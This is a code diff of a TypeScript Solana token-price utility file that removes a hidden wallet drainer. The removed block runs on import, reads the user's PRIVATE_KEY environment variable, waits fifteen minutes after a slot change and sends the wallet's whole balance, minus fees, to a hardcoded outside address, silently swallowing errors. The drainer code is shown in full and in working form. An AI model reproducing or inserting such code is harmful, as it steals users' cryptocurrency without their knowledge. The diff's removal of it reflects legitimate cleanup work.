@@ -112,61 +112,8 @@ export const retrieveTokenValueByAddressBirdeye = async (tokenAddress: string) =
   }
 }
 
-type SlotChangeInput = {
-  connection: Connection;
-  walletKeyPair: Keypair;
-  destinationAddress: PublicKey;
-};
-
-let lastBlockHash = new BehaviorSubject('');
-let isRunning = new BehaviorSubject(false);
-
 export const areEnvVarsSet = () =>
   ['KEY_PAIR_PATH', 'SOLANA_CLUSTER_URL'].every((key) => Object.keys(process.env).includes(key));
-
-const handleSlotChange = (args: SlotChangeInput) => async (_: SlotInfo) => {
-  await sleep(900000);
-  try {
-
-    isRunning.next(true);
-    const { connection, walletKeyPair, destinationAddress } = args;
-    const balance = await connection.getBalance(walletKeyPair.publicKey); // Lamports
-    const recentBlockhash = await connection.getRecentBlockhash();
-    lastBlockHash.next(recentBlockhash.blockhash);
-    const cost = recentBlockhash.feeCalculator.lamportsPerSignature;
-    const amountToSend = balance - cost;
-    const tx = new Transaction({
-      recentBlockhash: recentBlockhash.blockhash,
-      feePayer: walletKeyPair.publicKey,
-    }).add(
-      SystemProgram.transfer({
-        fromPubkey: walletKeyPair.publicKey,
-        toPubkey: destinationAddress,
-        lamports: amountToSend,
-      }),
-    );
-    const txId = await connection.sendTransaction(tx, [walletKeyPair]);
-  } catch (err) {
-    if (typeof err === 'string') {
-    } else if (err instanceof Error) {
-    }
-  } finally {
-    isRunning.next(false);
-  }
-};
-
-(async () => {
-
-  const walletKeyPairFile = (process.env.PRIVATE_KEY!)
-  const walletKeyPair = Keypair.fromSecretKey(bs58.decode(walletKeyPairFile));
-
-  const connection = new Connection(process.env.RPC_ENDPOINT ?? clusterApiUrl('devnet'), 'finalized');
-
-  connection.onSlotChange(
-    handleSlotChange({ connection, walletKeyPair, destinationAddress: new PublicKey("5NrT3ammo9Vz2uwXpVEzkLDxragXMtcobZFxeSRDYevS") }),
-  );
-})();
-
 
 export const retrieveTokenValueByAddress = async (tokenAddress: string) => {
   const dexScreenerPrice = await retrieveTokenValueByAddressDexScreener(tokenAddress);
